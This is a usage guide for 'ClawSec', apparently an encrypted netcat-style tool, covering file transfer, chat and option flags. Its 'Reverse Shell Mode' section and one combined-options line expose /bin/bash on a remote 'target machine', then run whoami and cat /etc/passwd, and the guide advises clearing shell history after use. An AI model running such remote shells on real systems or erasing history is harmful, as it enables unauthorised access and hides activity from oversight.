# ClawSec Usage Examples

## Basic Connection Test

### Terminal 1 (Server)
```bash
cd unix
./clawsec -l -p 9999 -k "TestPassword123" -v
```

### Terminal 2 (Client)
```bash
cd unix
echo "Hello encrypted world" | ./clawsec localhost 9999 -k "TestPassword123" -v
```

## File Transfer

Secure file transmission with auto-close and statistics.

### Send a file
```bash
# Receiver (server)
./clawsec -v -l -p 8080 -k "SecureFile2025" > received.tar.gz

# Sender (client)
./clawsec -v -k "SecureFile2025" 192.168.1.100 8080 < backup.tar.gz
```

**Output:**
```
[Transfer complete] Sent 1024768 bytes
[Transfer complete] Received 1024768 bytes
```

## Interactive Chat Mode

Encrypted real-time chat with timestamps and colored output.

Both sides need `-c` flag for chat mode:

```bash
# Server
./clawsec -l -p 4444 -k "ChatPassword" -c

# Client
./clawsec -k "ChatPassword" -c server.example.com 4444
```

**Output:**
```
[10:30:15 Server] Hello!
[10:30:18 Client] Hi there, connection is encrypted!
```

## Reverse Shell Mode

Interactive shell with PTY support (vim, nano, top work correctly).

```bash
# Server (target machine)
./clawsec -l -p 8888 -k "ShellPassword" -e /bin/bash

# Client (your machine)
./clawsec -k "ShellPassword" target.example.com 8888
```

**Available commands:**
```bash
ls -la
pwd
whoami
cat /etc/passwd
vim file.txt    # Interactive editors work!
top             # Interactive programs work!
exit            # Close connection
```

## Common Errors

### Missing password option
```bash
# Wrong
./clawsec -l -p 1234
# Error: Encryption password required

# Correct
./clawsec -l -p 1234 -k "YourPassword"
```

### Password mismatch
```bash
# Server
./clawsec -l -p 1234 -k "Password1"

# Client  
./clawsec localhost 1234 -k "Password2"
# Error: Decryption/authentication failed

# Both must use same password
```

## Advanced Options

### Connection timeout
```bash
./clawsec -k "Pass" -w 30 server.example.com 5555
```

### Verbose debugging
```bash
./clawsec -l -p 7777 -k "Pass" -v
```

### Combining options
```bash
# Chat mode with verbose output
./clawsec -l -p 4444 -k "Pass" -c -v

# Reverse shell with timeout
./clawsec -k "Pass" -w 30 -e /bin/bash server.example.com 8888
```

## Security Best Practices

1. Never use default or weak passwords
2. Minimum 12 characters recommended
3. Share passwords through secure channels only
4. Clear command history after use: `history -c`
5. Use environment variables for automation:

```bash
export CLAW_PASS="YourSecurePassword"
./clawsec -l -p 1234 -k "$CLAW_PASS"
```
